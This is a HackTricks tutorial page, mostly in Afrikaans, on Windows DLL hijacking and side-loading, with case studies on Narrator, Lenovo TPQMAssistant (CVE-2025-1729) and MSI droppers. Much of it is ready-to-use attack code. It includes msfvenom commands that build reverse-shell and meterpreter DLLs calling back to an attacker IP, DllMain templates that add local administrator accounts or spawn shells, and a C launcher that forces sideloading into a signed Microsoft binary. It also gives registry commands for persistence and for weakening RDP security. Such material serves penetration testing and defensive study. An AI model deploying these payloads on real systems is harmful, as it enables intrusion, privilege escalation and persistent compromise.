# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n betroubare toepassing om 'n kwaadwillige DLL te laai. Hierdie term dek verskeie taktieke soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, die verkryging van persistence, en, minder algemeen, privilege escalation. Alhoewel die fokus hier op escalation is, bly die metode van hijacking konsekwent oor doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, elk met verskillende doeltreffendheid afhangend van die toepassing se DLL-laaistrategie:

1. **DLL Replacement**: Vervang 'n genuiene DLL met 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die funksionaliteit van die oorspronklike DLL te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad wat voor die legitieme een gekontroleer word, deur die toepassing se soekpatroon uit te buit.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL sodat 'n toepassing dit laai, omdat dit dink dit is 'n nie-bestaande vereiste DLL.
4. **DLL Redirection**: Wysig soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die legitieme DLL met 'n kwaadwillige teenhanger in die WinSxS gids, 'n metode wat dikwels geassosieer word met DLL side-loading.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n gebruikerbeheerde gids saam met die gekopieerde toepassing, wat ooreenstem met Binary Proxy Execution tegnieke.

## Vind ontbrekende Dlls

Die algemeenste manier om ontbrekende Dlls binne 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop, en die volgende 2 filters te stel:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en net die **File System Activity** wys:

![](<../../../images/image (153).png>)

As jy na **missing dlls in general** soek, laat dit vir 'n paar **seconds** hardloop.\
As jy na 'n **missing dll inside an specific executable** soek, moet jy 'n **ander filter** stel soos "Process Name" "contains" `<exec name>`, voer dit uit, en stop die gebeurtenisopname.

## Exploiting Missing Dlls

Om privilege escalation te bereik, is ons beste kans om 'n dll te kan **skryf wat 'n privileged proses sal probeer laai** in een van die **plekke waar dit gesoek sal word**. Daarom sal ons in staat wees om 'n dll te **skryf** in 'n **gids** waar die **dll gesoek word voor** die gids waar die **oorspronklike dll** is (vreemde geval), of ons sal in staat wees om op 'n gids te **skryf** waar die dll gesoek gaan word en die oorspronklike **dll nie in enige gids bestaan nie**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows applications look for DLLs by following a set of pre-defined search paths, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **default** soekorde met **SafeDllSearchMode** aangeskakel. Wanneer dit gedeaktiveer is, skuif die huidige gids na tweede plek. Om hierdie kenmerk af te skakel, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (default is enabled).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word begin die soektog in die gids van die uitvoerbare modul wat **LoadLibraryEx** besig is om te laai.

Laastens, let daarop dat 'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam. In daardie geval sal daardie dll slegs in daardie pad gesoek word (as die dll enige afhanklikhede het, sal hulle gesoek word soos gewoonlik vir 'n dll wat per naam gelaai is).

Daar is ander maniere om die soekorde te verander, maar ek gaan dit nie hier verduidelik nie.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

'n Gevorderde manier om deterministies die DLL soekpad van 'n nuut geskepte proses te beïnvloed, is om die DllPath veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses geskep word met ntdll’s native APIs. Deur 'n aanvaller-beheerde gids hier te verskaf, kan 'n teikenproses wat 'n ingevoerde DLL per naam oplos (geen absolute pad en nie die safe loading flags gebruik nie) gedwing word om 'n kwaadwillige DLL vanaf daardie gids te laai.

Sleutelidee
- Bou die prosesparameters met RtlCreateProcessParametersEx en voorsien 'n persoonlike DllPath wat na jou beheerde gids wys (bv. die gids waar jou dropper/unpacker woon).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binêr 'n DLL per naam oplos, sal die laaier hierdie verskafde DllPath raadpleeg tydens die resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE geplaas is nie.

Notas/beperkings
- Dit beïnvloed die kindproses wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet 'n DLL invoer of via LoadLibrary per naam laai (geen absolute pad en nie die gebruik van LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories nie).
- KnownDLLs en hardgekodeerde absolute paaie kan nie gehijack word nie. Forwarded exports en SxS kan die prioriteit verander.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Volledige C voorbeeld: afdwing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operationele gebruiksvoorbeeld
- Plaas 'n kwaadwillige xmllite.dll (wat die vereiste funksies uitvoer of as 'n proxy na die werklike een optree) in jou DllPath-gids.
- Start 'n ondertekende binêre wat bekend is daarvoor dat dit xmllite.dll by naam opsoek met die bogenoemde tegniek. Die loader los die import op via die verskafte DllPath en sideloads jou DLL.

Hierdie tegniek is in die veld waargeneem om multi-stage sideloading-kettings aan te dryf: 'n aanvanklike launcher laat 'n helper DLL val, wat dan 'n Microsoft-ondertekende, hijackable binêre spawn met 'n pasgemaakte DllPath om die laai van die aanvaller se DLL vanaf 'n staging directory af te dwing.


#### Uitsonderings op dll soekorde uit Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-zoekorde word in Windows-dokumentasie aangeteken:

- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in geheue gelaai is** teëgekom word, slaan die stelsel die gewone soektog oor. In plaas daarvan voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit na die reeds in geheue gelaaide DLL terugval. **In hierdie scenario voer die stelsel geen soektog vir die DLL uit nie**.
- In gevalle waar die DLL erken word as 'n **known DLL** vir die huidige Windows-weergawe, sal die stelsel sy weergawe van die known DLL gebruik, tesame met enige van sy afhanklike DLLs, **sonder die soekproses**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie known DLLs.
- As 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n volledige pad geïdentifiseer is.

### Eskalering van regte

**Vereistes**:

- Identifiseer 'n proses wat werk of sal werk onder **verskillende regte** (horizontale of laterale beweging), waarin 'n **DLL ontbreek**.
- Verseker dat **skryf-toegang** beskikbaar is vir enige **gids** waarin die **DLL** gesoek sal word. Hierdie ligging kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.

Ja, die vereistes is moeilik om te vind omdat dit **per verstek nogal vreemd is om 'n bevoegde uitvoerbare lêer te vind wat 'n dll ontbreek** en dit is selfs **vreemder om skryfregte op 'n stelselpad-gids te hê** (jy het dit nie per verstek nie). Maar in verkeerd gekonfigureerde omgewings is dit moontlik. In die geval dat jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **hoofdoel van die projek om UAC te omseil**, mag jy daar 'n **PoC** van 'n Dll hijacking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik deur net die pad van die gids waarin jy skryfreg het te verander).

Let daarop dat jy jou **toestemmings in 'n gids kan kontroleer** deur die volgende te doen:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die toestemmings van alle gidse binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **misbruik Dll Hijacking om privilegies te eskaleer** met skryfregte in 'n **System Path-lêergids** kyk:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outomatiese gereedskap

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kontroleer of jy skryfregte het op enige gids binne system PATH.\
Andere interessante outomatiese gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

Indien jy 'n uitbuitbare scenario vind, een van die belangrikste dinge om dit suksesvol uit te buit, is om **'n dll te skep wat ten minste al die funksies eksporteer wat die executable daaruit sal invoer**. Neem egter kennis dat Dll Hijacking handig kan wees om te [eskaleer van Medium Integrity-vlak na High **(UAC te omseil)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder, in die **volgende afdeling** kan jy 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll met nie-vereiste funksies geëksporteer** te skep.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat jou kwaadwillige kode kan uitvoer wanneer dit gelaai word, maar ook die verwagte gedrag kan handhaaf deur alle oproepe na die werklike library te herlei.

Met die instrumente [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik 'n executable aandui en die library kies wat jy wil proxify en 'n proxified dll genereer, of die Dll aandui en 'n proxified dll genereer.

### **Meterpreter**

**Kry rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let wel dat in verskeie gevalle die Dll wat jy kompileer moet **export several functions** wat deur die victim process gelaai gaan word. As hierdie funksies nie bestaan nie, sal die **binary won't be able to load** hulle en die **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld met die skep van 'n gebruiker</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL with thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevalstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe soek by opstart steeds na 'n voorspelbare, taalspesifieke localization DLL wat gekaap kan word vir arbitrary code execution en persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC-stilte
- ’n Naïewe hijack sal die UI laat praat/uitlig. Om stil te bly, tel by attach die Narrator threads, open die hoofdraad (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie thread. Sien PoC vir die volle kode.

Trigger en persistensie via Accessibility-konfigurasie
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde laai die begin van Narrator die geplante DLL. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te begin.

RDP-gedrewe SYSTEM-uitvoering (laterale beweging)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die host, op die logon screen druk CTRL+WIN+ENTER om Narrator te lanseer; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Uitvoering stop wanneer die RDP-sessie sluit—injekteer/migreer onmiddellik.

Bring Your Own Accessibility (BYOA)
- Jy kan ’n ingeboude Accessibility Tool (AT) registerinskrywing kloon (bv. CursorIndicator), dit wysig om na ’n arbitrêre binary/DLL te wys, dit importeer, en dan `configuration` op daardie AT-naam stel. Dit maak dit moontlik om arbitrêre kode onder die Accessibility-raamwerk uit te voer.

Notes
- Om te skryf onder `%windir%\System32` en HKLM-waardes te verander vereis admin-regte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` woon; geen exports is nodig nie.

## Gevalstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), geïdentifiseer as **CVE-2025-1729**.

### Kwetsbaarheidsbesonderhede

- **Komponent**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` hardloop daagliks om 09:30 onder die konteks van die aangemelde gebruiker.
- **Directory Permissions**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om arbitrêre lêers te plaas.
- **DLL Search Behavior**: Probeer eers om `hostfxr.dll` uit sy werksgids te laai en log "NAME NOT FOUND" as dit ontbreek, wat aandui dat die plaaslike gids eerste gesoek word.

### Exploit Implementation

’n Aanvaller kan ’n kwaadwillige `hostfxr.dll` stub in dieselfde gids plaas, die ontbrekende DLL uitbuit om kode-uitvoering onder die gebruiker se konteks te bereik:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalvloeistroom

1. As 'n gewone gebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag dat die geskeduleerde taak om 09:30 in die huidige gebruiker se konteks uitgevoer word.
3. As 'n administrateur aangemeld is wanneer die taak uitgevoer word, loop die kwaadwillige DLL in die administrateur se sessie op medium-integriteit.
4. Koppel standaard UAC bypass-tegnieke om van medium-integriteit na SYSTEM-privileges te verhoog.

## Gevalstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Dreigakteure kombineer dikwels MSI-gebaseerde droppers met DLL side-loading om payloads onder 'n vertroude, gesigneerde proses uit te voer.

Ketting-oorsig
- Gebruiker laai MSI af. 'n CustomAction loop stilweg tydens die GUI-installasie (bv. LaunchApplication of 'n VBScript-aksie), en herbou die volgende fase uit ingebedde hulpbronne.
- Die dropper skryf 'n wettige, gesigneerde EXE en 'n kwaadwillige DLL na dieselfde gids (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wanneer die gesigneerde EXE begin, laai die Windows DLL-soekorde eers wsc.dll vanaf die werkgids, wat aanvallerskode onder 'n gesigneerde ouer uitvoer (ATT&CK T1574.001).

MSI-analise (waarop om te let)
- CustomAction table:
- Soek na inskrywings wat uitvoerbare lêers of VBScript loop. Verdagte voorbeeldpatroon: LaunchApplication wat 'n ingebedde lêer op die agtergrond uitvoer.
- In Orca (Microsoft Orca.exe), ondersoek CustomAction, InstallExecuteSequence en Binary tables.
- Ingeslote/gesplitste payloads in die MSI CAB:
- Administratiewe uittreksel: msiexec /a package.msi /qb TARGETDIR=C:\out
- Of gebruik lessmsi: lessmsi x package.msi C:\out
- Soek na verskeie klein fragmente wat aanmekaar geplak en deur 'n VBScript CustomAction gedekripteer word. Algemene vloei:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
- wsc_proxy.exe: legitiem ondertekende host (Avast). Die proses probeer wsc.dll per naam vanaf sy gids laai.
- wsc.dll: attacker DLL. As geen spesifieke exports benodig word nie, kan DllMain volstaan; anders bou 'n proxy DLL en stuur die vereiste exports na die egte biblioteek terwyl die payload in DllMain uitgevoer word.
- Bou 'n minimale DLL-payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir exportvereistes, gebruik 'n proxying framework (e.g., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL-naamresolusie deur die host binary. As die host absolute paths of safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) gebruik, kan die hijack misluk.
- KnownDLLs, SxS, en forwarded exports kan invloed hê op voorrang en moet oorweeg word tydens die keuse van die host binary en export set.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
